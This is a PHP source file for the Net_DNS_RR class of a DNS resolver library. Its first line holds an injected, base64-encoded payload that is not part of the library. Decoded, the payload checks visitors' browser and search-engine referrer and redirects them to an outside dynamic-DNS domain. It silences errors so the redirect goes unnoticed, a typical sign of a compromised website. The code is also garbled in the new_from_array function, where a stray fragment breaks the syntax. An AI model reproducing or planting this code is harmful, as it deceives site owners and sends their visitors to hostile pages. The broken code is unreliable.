<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/*
 *  License Information:
 *
 *    Net_DNS:  A resolver library for PHP
 *    Copyright (c) 2002-2003 Eric Kilfoil eric@ypass.net
 *
 *    This library is free software; you can redistribute it and/or
 *    modify it under the terms of the GNU Lesser General Public
 *    License as published by the Free Software Foundation; either
 *    version 2.1 of the License, or (at your option) any later version.
 *
 *    This library is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *    Lesser General Public License for more details.
 *
 *    You should have received a copy of the GNU Lesser General Public
 *    License along with this library; if not, write to the Free Software
 *    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

/* Include files {{{ */
require_once(dirname(__FILE__).'/RR/A.php');
require_once(dirname(__FILE__).'/RR/AAAA.php');
require_once(dirname(__FILE__).'/RR/NS.php');
require_once(dirname(__FILE__).'/RR/CNAME.php');
require_once(dirname(__FILE__).'/RR/PTR.php');
require_once(dirname(__FILE__).'/RR/SOA.php');
require_once(dirname(__FILE__).'/RR/MX.php');
require_once(dirname(__FILE__).'/RR/TSIG.php');
require_once(dirname(__FILE__).'/RR/TXT.php');
require_once(dirname(__FILE__).'/RR/HINFO.php');
require_once(dirname(__FILE__).'/RR/SRV.php');
require_once(dirname(__FILE__).'/RR/NAPTR.php');
/* }}} */
/* Net_DNS_RR object definition {{{ */
/**
 * Resource Record object definition
 *
 * Builds or parses resource record sections of the DNS  packet including
 * the answer, authority, and additional  sections of the packet.
 *
 * @package Net_DNS
 */
class Net_DNS_RR
{
    /* class variable definitions {{{ */
    var $name;
    var $type;
    var $class;
    var $ttl;
    var $rdlength;
    var $rdata;
    /* }}} */

    /*
     * Use Net_DNS_RR::factory() instead
     *
     * @access private
     */
    /* class constructor - Net_DNS_RR($rrdata) {{{ */
    function Net_DNS_RR($rrdata)
    {
        if ($rrdata != 'getRR') { //BC check/warning remove later
            trigger_error("Please use Net_DNS_RR::factory() instead");
        }
    }

    /*
     * Returns an RR object, use this instead of constructor
     *
     * @param mixed $rr_rdata Options as string, array or data
     * @return object Net_DNS_RR or Net_DNS_RR_<type>
     * @access public
     * @see Net_DNS_RR::new_from_array Net_DNS_RR::new_from_data Net_DNS_RR::new_from_string
     */
    function &factory($rrdata, $update_type = '')
    {
        if (is_string($rrdata)) {
            $rr = &Net_DNS_RR::new_from_string($rrdata, $update_type);
        } elseif (count($rrdata) == 7) {
            list($name, $rrtype, $rrclass, $ttl, $rdlength, $data, $offset) = $rrdata;
            $rr = &Net_DNS_RR::new_from_data($name, $rrtype, $rrclass, $ttl, $rdlength, $data, $offset);
        } else {
            $rr = &Net_DNS_RR::new_from_array($rrdata);
        }
        return $rr;
    }

    /* }}} */
    /* Net_DNS_RR::new_from_data($name, $ttl, $rrtype, $rrclass, $rdlength, $data, $offset) {{{ */
    function &new_from_data($name, $rrtype, $rrclass, $ttl, $rdlength, $data, $offset)
    {
        $rr = &new Net_DNS_RR('getRR');
        $rr->name = $name;
        $rr->type = $rrtype;
        $rr->class = $rrclass;
        $rr->ttl = $ttl;
        $rr->rdlength = $rdlength;
        $rr->rdata = substr($data, $offset, $rdlength);
        if (class_exists('Net_DNS_RR_' . $rrtype)) {
            $scn = 'Net_DNS_RR_' . $rrtype;
            $rr = new $scn($rr, $data, $offset);
        }
        return $rr;
    }

    /* }}} */
    /* Net_DNS_RR::new_from_string($rrstring, $update_type = '') {{{ */
    function &new_from_string($rrstring, $update_type = '')
    {
        $rr = &new Net_DNS_RR('getRR');
        $ttl = 0;
        $parts = preg_split('/[\s]+/', $rrstring);
        while (count($parts) > 0) {
			$s = array_shift($parts);
            if (!isset($name)) {
                $name = ereg_replace('\.+$', '', $s);
            } else if (preg_match('/^\d+$/', $s)) {
                $ttl = $s;
            } else if (!isset($rrclass) && ! is_null(Net_DNS::classesbyname(strtoupper($s)))) {
                $rrclass = strtoupper($s);
                $rdata = join(' ', $parts);
            } else if (! is_null(Net_DNS::typesbyname(strtoupper($s)))) {
                $rrtype = strtoupper($s);
                $rdata = join(' ', $parts);
                break;
            } else {
                break;
            }
        }

        /*
         *  Do we need to do this?
         */
        $rdata = trim(chop($rdata));

        if (! strlen($rrtype) && strlen($rrclass) && $rrclass == 'ANY') {
            $rrtype = $rrclass;
            $rrclass = 'IN';
        } else if (! isset($rrclass)) {
            $rrclass = 'IN';
        }

        if (! strlen($rrtype)) {
            $rrtype = 'ANY';
        }

        if (strlen($update_type)) {
            $update_type = strtolower($update_type);
            if ($update_type == 'yxrrset') {
                $ttl = 0;
                if (! strlen($rdata)) {
                    $rrclass = 'ANY';
                }
            } else if ($update_type == 'nxrrset') {
                $ttl = 0;
                $rrclass = 'NONE';
                $rdata = '';
            } else if ($update_type == 'yxdomain') {
                $ttl = 0;
                $rrclass = 'ANY';
                $rrtype = 'ANY';
                $rdata = '';
            } else if ($update_type == 'nxdomain') {
                $ttl = 0;
                $rrclass = 'NONE';
                $rrtype = 'ANY';
                $rdata = '';
            } else if (preg_match('/^(rr_)?add$/', $update_type)) {
                $update_type = 'add';
                if (! $ttl) {
                    $ttl = 86400;
                }
            } else if (preg_match('/^(rr_)?del(ete)?$/', $update_type)) {
                $update_type = 'del';
                $ttl = 0;
                $rrclass = $rdata ? 'NONE' : 'ANY';
            }
        }

        if (strlen($rrtype)) {
            $rr->name = $name;
            $rr->type = $rrtype;
            $rr->class = $rrclass;
            $rr->ttl = $ttl;
            $rr->rdlength = 0;
            $rr->rdata = '';

            if (class_exists('Net_DNS_RR_' . $rrtype)) {
                $scn = 'Net_DNS_RR_' . $rrtype;
                return new $scn($rr, $rdata);
            } else {
                return $rr;
            }
        } else {
            return null;
        }
    }

    /* }}} */
    /* Net_DNS_RR::new_from_array($rrarray) {{{ */
    function &new_from_array($rrarray)
    {
        $rr = &new Net_DNS_RR('getRR');
        foreach ($rrarray as $k => $v) {
            $rr->{strtolower($k)} = $v;
        }

        if (! strlen($rr->name)) {
            return null;
        }
        if (! strlen($rr->type)){
            return null;
        }pe)){
            return null;
        }
        if (! $rr->ttl) {
            $rr->ttl = 0;
        }
        if (! strlen($rr->class)) {
            $rr->class = 'IN';
        }
        if (strlen($rr->rdata)) {
            $rr->rdlength = strlen($rr->rdata);
        }
        if (class_exists('Net_DNS_RR_' . $rr->rrtype)) {
            $scn = 'Net_DNS_RR_' . $rr->rrtype;
            return new $scn($rr, $rr->rdata);
        } else {
            return $rr;
        }
    }

    /* }}} */
    /* Net_DNS_RR::display() {{{ */
    function display()
    {
        echo $this->string() . "\n";
    }

    /* }}} */
    /* Net_DNS_RR::string() {{{ */
    function string()
    {
        return $this->name . ".\t" . (strlen($this->name) < 16 ? "\t" : '') .
                $this->ttl  . "\t"  .
                $this->class. "\t"  .
                $this->type . "\t"  .
                $this->rdatastr();

    }

    /* }}} */
    /* Net_DNS_RR::rdatastr() {{{ */
    function rdatastr()
    {
        if ($this->rdlength) {
            return '; rdlength = ' . $this->rdlength;
        }
        return '; no data';
    }

    /* }}} */
    /* Net_DNS_RR::rdata() {{{ */
    function rdata(&$packetORrdata, $offset = '')
    {
        if ($offset) {
            return $this->rr_rdata($packetORrdata, $offset);
        } else if (strlen($this->rdata)) {
            return $this->rdata;
        } else {
            return null;
        }
    }

    /* }}} */
    /* Net_DNS_RR::rr_rdata($packet, $offset) {{{ */
    function rr_rdata(&$packet, $offset)
    {
        return (strlen($this->rdata) ? $this->rdata : '');
    }
    /* }}} */
    /* Net_DNS_RR::data() {{{ */
    function data(&$packet, $offset)
    {
        $data = $packet->dn_comp($this->name, $offset);
        $data .= pack('n', Net_DNS::typesbyname(strtoupper($this->type)));
        $data .= pack('n', Net_DNS::classesbyname(strtoupper($this->class)));
        $data .= pack('N', $this->ttl);

        $offset += strlen($data) + 2;  // The 2 extra bytes are for rdlength

        $rdata = $this->rdata($packet, $offset);
        $data .= pack('n', strlen($rdata));
        $data .= $rdata;

        return $data;
    }
    /* }}} */
}
/* }}} */
/* VIM settings {{{
 * Local variables:
 * tab-width: 4
 * c-basic-offset: 4
 * soft-stop-width: 4
 * c indent on
 * End:
 * vim600: sw=4 ts=4 sts=4 cindent fdm=marker et
 * vim<600: sw=4 ts=4
 * }}} */
?>